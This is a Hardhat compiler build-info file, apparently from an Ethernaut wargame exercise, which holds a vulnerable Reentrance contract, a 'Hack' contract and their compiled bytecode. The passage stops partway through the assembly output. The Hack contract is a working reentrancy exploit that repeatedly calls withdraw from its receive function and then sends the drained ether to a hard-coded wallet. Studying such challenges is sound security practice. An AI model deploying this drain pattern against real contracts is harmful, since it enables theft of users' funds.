{
	"id": "1a4a89b8e139cecb22761a2e6f971aef",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.12",
	"solcLongVersion": "0.6.12+commit.27d51765",
	"input": {
		"language": "Solidity",
		"sources": {
			"security/etheranut/Reentrance/Reentrance.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.6.12;\r\n\r\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\r\n\r\ncontract Reentrance {\r\n    using SafeMath for uint256;\r\n\r\n    mapping(address => uint256) public balances;\r\n\r\n    function donate(address _to) public payable {\r\n        balances[_to] = balances[_to].add(msg.value);\r\n    }\r\n\r\n    function balanceOf(address _who) public view returns (uint256 balance) {\r\n        return balances[_who];\r\n    }\r\n\r\n    function withdraw(uint256 _amount) public {\r\n        if (balances[msg.sender] >= _amount) {\r\n            (bool result,) = msg.sender.call{value: _amount}(\"\");\r\n            if (result) {\r\n                _amount;\r\n            }\r\n            balances[msg.sender] -= _amount;\r\n        }\r\n    }\r\n\r\n    receive() external payable {}\r\n}\r\n\r\ncontract Hack {\r\n    address payable target = payable(0xa7B6f4Ca1D75a987bC1aC27C2AdA78EDfB164084);\r\n    Reentrance re = Reentrance(target);\r\n\r\n    function attack() public payable {\r\n        re.donate{value: 1000000000000000 wei}(address(this));\r\n        re.withdraw(100000000000000);\r\n    }\r\n\r\n    function reFund() public payable {\r\n        address payable myWallet = 0x2797F5291A7FAA3368fF031807b6B70C7bBEEF65;\r\n        require(address(this).balance > 0);\r\n        (bool success,) = payable(myWallet).call{value: address(this).balance}(\"\");\r\n        require (success,\"reFund failed\");\r\n    }\r\n\r\n    function getBalance() public view returns(uint256){\r\n        return re.balanceOf(address(this));\r\n    }\r\n\r\n    function getEthAmount() public view returns(uint256){\r\n        return address(this).balance;\r\n    }\r\n    \r\n\r\n\r\n    receive() external payable{\r\n        uint256 bal = re.balanceOf(address(this));\r\n        if (bal > 0) {\r\n            if(address(target).balance > 100000000000000)\r\n                re.withdraw(100000000000000);\r\n            else\r\n                re.withdraw(address(target).balance);\r\n        }\r\n    }\r\n\r\n}"
			},
			"@openzeppelin/contracts/math/SafeMath.sol": {
				"content": "// SPDX-License-Identifier: MIT\n\npragma solidity >=0.6.0 <0.8.0;\n\n/**\n * @dev Wrappers over Solidity's arithmetic operations with added overflow\n * checks.\n *\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\n * in bugs, because programmers usually assume that an overflow raises an\n * error, which is the standard behavior in high level programming languages.\n * `SafeMath` restores this intuition by reverting the transaction when an\n * operation overflows.\n *\n * Using this library instead of the unchecked operations eliminates an entire\n * class of bugs, so it's recommended to use it always.\n */\nlibrary SafeMath {\n    /**\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        uint256 c = a + b;\n        if (c < a) return (false, 0);\n        return (true, c);\n    }\n\n    /**\n     * @dev Returns the substraction of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        if (b > a) return (false, 0);\n        return (true, a - b);\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n        if (a == 0) return (true, 0);\n        uint256 c = a * b;\n        if (c / a != b) return (false, 0);\n        return (true, c);\n    }\n\n    /**\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        if (b == 0) return (false, 0);\n        return (true, a / b);\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        if (b == 0) return (false, 0);\n        return (true, a % b);\n    }\n\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     *\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n        return c;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b <= a, \"SafeMath: subtraction overflow\");\n        return a - b;\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     *\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) return 0;\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n        return c;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers, reverting on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b > 0, \"SafeMath: division by zero\");\n        return a / b;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b > 0, \"SafeMath: modulo by zero\");\n        return a % b;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {trySub}.\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        return a - b;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {tryDiv}.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        return a / b;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting with custom message when dividing by zero.\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {tryMod}.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        return a % b;\n    }\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"@openzeppelin/contracts/math/SafeMath.sol": {
				"SafeMath": {
					"abi": [],
					"devdoc": {
						"details": "Wrappers over Solidity's arithmetic operations with added overflow checks. Arithmetic operations in Solidity wrap on overflow. This can easily result in bugs, because programmers usually assume that an overflow raises an error, which is the standard behavior in high level programming languages. `SafeMath` restores this intuition by reverting the transaction when an operation overflows. Using this library instead of the unchecked operations eliminates an entire class of bugs, so it's recommended to use it always.",
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"@openzeppelin/contracts/math/SafeMath.sol\":630:7224  library SafeMath {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n  0x0b\n  dup3\n  dup3\n  dup3\n  codecopy\n  dup1\n  mload\n  0x00\n  byte\n  0x73\n  eq\n  tag_1\n  jumpi\n  invalid\ntag_1:\n  mstore(0x00, address)\n  0x73\n  dup2\n  mstore8\n  dup3\n  dup2\n  return\nstop\n\nsub_0: assembly {\n        /* \"@openzeppelin/contracts/math/SafeMath.sol\":630:7224  library SafeMath {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa264697066735822122055f9260f387617f8a3c61d823235142789395d0039759e4f776f3b7674fd13ce64736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60566023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea264697066735822122055f9260f387617f8a3c61d823235142789395d0039759e4f776f3b7674fd13ce64736f6c634300060c0033",
							"opcodes": "PUSH1 0x56 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SSTORE 0xF9 0x26 0xF CODESIZE PUSH23 0x17F8A3C61D823235142789395D0039759E4F776F3B7674 REVERT SGT 0xCE PUSH5 0x736F6C6343 STOP MOD 0xC STOP CALLER ",
							"sourceMap": "630:6594:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea264697066735822122055f9260f387617f8a3c61d823235142789395d0039759e4f776f3b7674fd13ce64736f6c634300060c0033",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SSTORE 0xF9 0x26 0xF CODESIZE PUSH23 0x17F8A3C61D823235142789395D0039759E4F776F3B7674 REVERT SGT 0xCE PUSH5 0x736F6C6343 STOP MOD 0xC STOP CALLER ",
							"sourceMap": "630:6594:0:-:0;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17200",
								"executionCost": "97",
								"totalCost": "17297"
							},
							"internal": {
								"add(uint256,uint256)": "infinite",
								"div(uint256,uint256)": "infinite",
								"div(uint256,uint256,string memory)": "infinite",
								"mod(uint256,uint256)": "infinite",
								"mod(uint256,uint256,string memory)": "infinite",
								"mul(uint256,uint256)": "infinite",
								"sub(uint256,uint256)": "infinite",
								"sub(uint256,uint256,string memory)": "infinite",
								"tryAdd(uint256,uint256)": "infinite",
								"tryDiv(uint256,uint256)": "infinite",
								"tryMod(uint256,uint256)": "infinite",
								"tryMul(uint256,uint256)": "infinite",
								"trySub(uint256,uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 630,
									"end": 7224,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "PUSH",
									"source": 0,
									"value": "B"
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "BYTE",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "PUSH",
									"source": 0,
									"value": "73"
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "EQ",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "INVALID",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "ADDRESS",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "PUSH",
									"source": 0,
									"value": "73"
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "MSTORE8",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a264697066735822122055f9260f387617f8a3c61d823235142789395d0039759e4f776f3b7674fd13ce64736f6c634300060c0033",
									".code": [
										{
											"begin": 630,
											"end": 7224,
											"name": "PUSHDEPLOYADDRESS",
											"source": 0
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "ADDRESS",
											"source": 0
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "REVERT",
											"source": 0
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Wrappers over Solidity's arithmetic operations with added overflow checks. Arithmetic operations in Solidity wrap on overflow. This can easily result in bugs, because programmers usually assume that an overflow raises an error, which is the standard behavior in high level programming languages. `SafeMath` restores this intuition by reverting the transaction when an operation overflows. Using this library instead of the unchecked operations eliminates an entire class of bugs, so it's recommended to use it always.\",\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/math/SafeMath.sol\":\"SafeMath\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/math/SafeMath.sol\":{\"keccak256\":\"0xcc78a17dd88fa5a2edc60c8489e2f405c0913b377216a5b26b35656b2d0dab52\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://526dc85e1f9b9b45830e202568d267d93dde7a4fcccf4ad7798dadcd92304d3c\",\"dweb:/ipfs/QmaoXMB972J3cSDLtBq3xBo4jLwqD2uzXTwujtSPqkYVhR\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"security/etheranut/Reentrance/Reentrance.sol": {
				"Hack": {
					"abi": [
						{
							"inputs": [],
							"name": "attack",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "getBalance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "getEthAmount",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "reFund",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"security/etheranut/Reentrance/Reentrance.sol\":798:1931  contract Hack {\r... */\n  mstore(0x40, 0x80)\n    /* \"security/etheranut/Reentrance/Reentrance.sol\":852:894  0xa7B6f4Ca1D75a987bC1aC27C2AdA78EDfB164084 */\n  0xa7b6f4ca1d75a987bc1ac27c2ada78edfb164084\n    /* \"security/etheranut/Reentrance/Reentrance.sol\":819:895  address payable target = payable(0xa7B6f4Ca1D75a987bC1aC27C2AdA78EDfB164084) */\n  0x00\n  dup1\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"security/etheranut/Reentrance/Reentrance.sol\":929:935  target */\n  0x00\n  dup1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"security/etheranut/Reentrance/Reentrance.sol\":902:936  Reentrance re = Reentrance(target) */\n  0x01\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"security/etheranut/Reentrance/Reentrance.sol\":798:1931  contract Hack {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":798:1931  contract Hack {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x087d01df\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x0ff0a4df\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x12065fe0\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1663:1674  uint256 bal */\n      0x00\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1677:1679  re */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1677:1689  re.balanceOf */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x70a08231\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1698:1702  this */\n      address\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1677:1704  re.balanceOf(address(this)) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_9\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_9:\n      pop\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_11\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_11:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      0x20\n      dup2\n      lt\n      iszero\n      tag_12\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_12:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1663:1704  uint256 bal = re.balanceOf(address(this)) */\n      swap1\n      pop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1725:1726  0 */\n      0x00\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1719:1722  bal */\n      dup2\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1719:1726  bal > 0 */\n      gt\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1715:1919  if (bal > 0) {\r... */\n      iszero\n      tag_13\n      jumpi\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1772:1787  100000000000000 */\n      0x5af3107a4000\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1754:1760  target */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1746:1769  address(target).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1746:1787  address(target).balance > 100000000000000 */\n      gt\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1743:1907  if(address(target).balance > 100000000000000)\r... */\n      iszero\n      tag_14\n      jumpi\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1806:1808  re */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1806:1817  re.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1818:1833  100000000000000 */\n      0x5af3107a4000\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1806:1834  re.withdraw(100000000000000) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_15\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_15:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_17\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_17:\n      pop\n      pop\n      pop\n      pop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1743:1907  if(address(target).balance > 100000000000000)\r... */\n      jump(tag_18)\n    tag_14:\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1871:1873  re */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1871:1882  re.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1891:1897  target */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1883:1906  address(target).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1871:1907  re.withdraw(address(target).balance) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_19\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_19:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_21\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_21:\n      pop\n      pop\n      pop\n      pop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1743:1907  if(address(target).balance > 100000000000000)\r... */\n    tag_18:\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1715:1919  if (bal > 0) {\r... */\n    tag_13:\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1626:1926  receive() external payable{\r... */\n      pop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":798:1931  contract Hack {\r... */\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1511:1610  function getEthAmount() public view returns(uint256){\r... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_22\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_22:\n      pop\n      tag_23\n      tag_24\n      jump\t// in\n    tag_23:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1097:1392  function reFund() public payable {\r... */\n    tag_4:\n      tag_25\n      tag_26\n      jump\t// in\n    tag_25:\n      stop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1400:1503  function getBalance() public view returns(uint256){\r... */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_27\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_27:\n      pop\n      tag_28\n      tag_29\n      jump\t// in\n    tag_28:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":945:1089  function attack() public payable {\r... */\n    tag_6:\n      tag_30\n      tag_31\n      jump\t// in\n    tag_30:\n      stop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1511:1610  function getEthAmount() public view returns(uint256){\r... */\n    tag_24:\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1555:1562  uint256 */\n      0x00\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1581:1602  address(this).balance */\n      selfbalance\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1574:1602  return address(this).balance */\n      swap1\n      pop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1511:1610  function getEthAmount() public view returns(uint256){\r... */\n      swap1\n      jump\t// out\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1097:1392  function reFund() public payable {\r... */\n    tag_26:\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1141:1165  address payable myWallet */\n      0x00\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1168:1210  0x2797F5291A7FAA3368fF031807b6B70C7bBEEF65 */\n      0x2797f5291a7faa3368ff031807b6b70c7bbeef65\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":1141:1210  address payable myWallet = 0x2797F5291A7FAA3368fF031807b6B70C7bBEEF65 */\n      swap1\n      